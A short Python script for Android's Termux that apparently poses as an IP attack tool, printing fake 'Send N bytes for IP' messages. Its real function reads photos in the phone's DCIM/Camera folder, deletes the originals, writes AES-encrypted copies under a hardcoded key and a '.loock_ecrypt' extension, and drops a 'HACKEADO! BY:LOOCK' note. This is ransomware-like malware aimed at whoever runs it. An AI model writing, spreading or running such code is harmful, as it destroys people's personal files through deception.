import pyaes,hashlib , os, re, time, random

password = b'1234567890123456'
local_t='/data/data/com.termux/files/home/storage/dcim/'

bytes = '/data/data/com.termux/files/home/storage/dcim/Camera'

def cls():
    os.system('clear')

def main():
    print ('''
   \033[0;31m ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
██░████▀▄▄▀█▀▄▄▀█▀▄▀█░█▀██░▄▄▀█░▄▀█▀▄▄▀█░▄▄
██░████░██░█░██░█░█▀█░▄▀██░██░█░█░█░██░█▄▄▀
██░▀▀░██▄▄███▄▄███▄██▄█▄██░▀▀░█▄▄███▄▄██▄▄▄
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
\033[0;m
    ''')
def attack(ip):
    global r
    r = random.randint(300,9999)
    print ('\033[0;32mSend\033[0;31m',r,'\033[0;32mbytes for\033[0;m', ip)
    time.sleep(0.5)
def readme():
    text = 'HACKEADO! BY:LOOCK'*5
    with open(local_t+'/Readme.txt', 'w') as file:
        file.write(text)

def getinfo():
    print ('\033[0;32mDigite o Ip!\033[0;m')
    ip = input(str('\033[0;33m>>>\033[0;m'))
    return ip
    
def Listdir(content):
    imgs = '/data/data/com.termux/files/home/storage/dcim/'
    
    names = os.listdir(imgs+content)
    return names
def reboot():
    os.system('clear')
    os.system('python3 app.py')
def encrypt(dir,ip):
    r = random.randint(300,9999)
    aes = pyaes.AESModeOfOperationCTR(password)
    with open(dir, 'rb') as file:
        data = file.read()
        file.close()
    print ('\033[0;32mReconect Ip!\033[0;m')
    print ('\033[0;32mSend\033[0;31m',r,'\033[0;32mbytes for\033[0;m', ip)
    os.remove(dir)
    print ('\033[0;32mSend\033[0;31m',r,'\033[0;32mbytes for\033[0;m', ip)
    path = dir+'.loock_ecrypt'
    with open(path, 'wb') as file:
        code = aes.encrypt(data)
        file.write(code)
        file.close()
        print ('\033[0;32mSend\033[0;31m',r,'\033[0;32mbytes for\033[0;m', ip)

    
        
byte = 'Camera'        

bytes = '/data/data/com.termux/files/home/storage/dcim/Camera'